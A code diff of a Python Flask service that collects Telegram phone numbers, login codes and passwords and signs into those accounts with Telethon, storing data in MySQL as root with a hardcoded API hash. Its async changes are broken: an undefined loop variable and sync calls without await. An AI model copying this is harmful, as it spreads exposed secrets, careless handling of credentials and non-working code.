@@ -1,5 +1,6 @@
 import mysql.connector
 import time
+import asyncio
 from telethon.errors import SessionPasswordNeededError
 from telethon.sync import TelegramClient
 from telethon.tl.types import InputPeerUser, InputPeerChannel
@@ -15,7 +16,8 @@ api_hash = 'f4c93d55681e17b14d516e8f5571e4cd'
 
 def main():
     global client
-    app.run(port=1234,host='0.0.0.0')
+    multi = multiprocessing.Process(target=api)
+    multi.start()
  
 # первоначальная проверка ключа на уникальность
 @app.route('/auth_init', methods=['POST'])
@@ -77,6 +79,8 @@ def auth_phone():
 # получаем код и выполняем вход
 @app.route('/auth_code', methods=['POST'])
 def auth_code():
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
     mydb = mysql.connector.connect(
         host = "localhost",
         user = "root",
@@ -97,16 +101,15 @@ def auth_code():
     mydb.commit()
     cursor.close()
     mydb.close()
-    multi = multiprocessing.Process(target=login(uniq_key,record[0],code,record[1]))
-    multi.start()
+    asyncio.run(login(uniq_key,record[0],code,record[1]))
     
-def login(uniq_key1, phone1, code1, password1):
+async def login(uniq_key1, phone1, code1, password1):
     phone = phone1
     code = code1
     uniq_key = uniq_key1
     password = password1
-    client = TelegramClient(str(uniq_key), api_id, api_hash) 
-    client.connect()
+    client = TelegramClient(str(uniq_key), api_id, api_hash, loop=loop) 
+    client.start()
     try:
       client.sign_in(phone, code)
       return "200"
@@ -114,5 +117,9 @@ def login(uniq_key1, phone1, code1, password1):
       client.sign_in(password)
       return "200"
     client.disconnect() 
+    
+
+def api():
+    app.run(port=1234,host='0.0.0.0')
     
 main()
